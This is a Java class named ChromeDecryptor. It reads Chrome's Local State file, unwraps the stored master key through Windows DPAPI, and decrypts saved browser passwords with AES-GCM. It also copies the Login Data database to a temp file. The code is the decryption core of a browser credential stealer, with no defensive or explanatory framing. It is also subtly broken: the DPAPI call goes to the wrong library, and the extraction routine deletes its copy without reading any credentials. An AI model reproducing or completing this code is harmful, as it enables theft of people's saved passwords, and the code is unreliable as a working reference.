import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinReg;
import java.io.File;
import java.io.Serializable;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

public class ChromeDecryptor {

    private static final Map<String, byte[]> masterKeyCache;

    private static final Map<String, List<JSONObject>> credentialCache;

    public static byte[] getMasterKey(String userDataPath) {

        if (masterKeyCache.containsKey(userDataPath)) {
            return masterKeyCache.get(userDataPath);
        }

        try {
            File localStateFile = new File(userDataPath + "\\Local State");
            if (!localStateFile.exists()) return null;

            String content = new String(
                Files.readAllBytes(localStateFile.toPath()),
                StandardCharsets.UTF_8
            );
            JSONObject json = new JSONObject(content);

            String encryptedKeyB64 = json
                .getJSONObject("os_crypt")
                .getString("encrypted_key");

            byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyB64);

            if (encryptedKey.length < 5) return null;
            byte[] dpApiData = Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length);

            byte[] masterKey = decryptWithDpapi(dpApiData);

            if (masterKey != null) {
                masterKeyCache.put(userDataPath, masterKey);
            }

            return masterKey;

        } catch (Exception e) {
            return null;
        }
    }

    public static byte[] decryptWithDpapi(byte[] encryptedData) {
        try {

            WinBase.DATA_BLOB dataIn = new WinBase.DATA_BLOB();
            dataIn.cbData = encryptedData.length;
            dataIn.pbData = encryptedData;

            WinBase.DATA_BLOB dataOut = new WinBase.DATA_BLOB();

            boolean success = Kernel32.INSTANCE.CryptUnprotectData(
                dataIn,
                null,
                null,
                null,
                null,
                0,
                dataOut
            );

            if (!success) return null;

            byte[] result = dataOut.pbData;

            Kernel32.INSTANCE.LocalFree(dataOut.pbData);

            return result;

        } catch (Exception e) {
            return null;
        }
    }

    public static String decryptCredential(byte[] encryptedValue, byte[] masterKey) {
        if (encryptedValue == null || encryptedValue.length < 15) return null;

        try {

            String prefix = new String(Arrays.copyOfRange(encryptedValue, 0, 3), StandardCharsets.UTF_8);

            if (prefix.equals("v10") || prefix.equals("v11")) {

                return decryptAesGcm(encryptedValue, masterKey);
            } else {

                byte[] decrypted = decryptWithDpapi(encryptedValue);
                return decrypted != null ? new String(decrypted, StandardCharsets.UTF_8) : null;
            }

        } catch (Exception e) {
            return null;
        }
    }

    private static String decryptAesGcm(byte[] data, byte[] key) throws Exception {

        byte[] iv = Arrays.copyOfRange(data, 3, 15);

        byte[] ciphertext = Arrays.copyOfRange(data, 15, data.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        GCMParameterSpec paramSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.DECRYPT_MODE, keySpec, paramSpec);

        byte[] decrypted = cipher.doFinal(ciphertext);
        return new String(decrypted, StandardCharsets.UTF_8);
    }

    public static List<JSONObject> extractCredentials(String profilePath, byte[] masterKey) {
        List<JSONObject> credentials = new ArrayList<>();

        File loginDataFile = new File(profilePath + "\\Login Data");
        if (!loginDataFile.exists()) return credentials;

        try {

            File tempFile = File.createTempFile("ld_" + new Random().nextInt(10000), ".db");
            Files.copy(loginDataFile.toPath(), tempFile.toPath(),
                java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            tempFile.delete();

        } catch (Exception e) {

        }

        return credentials;
    }

    static {
        masterKeyCache = new HashMap<>();
        credentialCache = new HashMap<>();
    }
}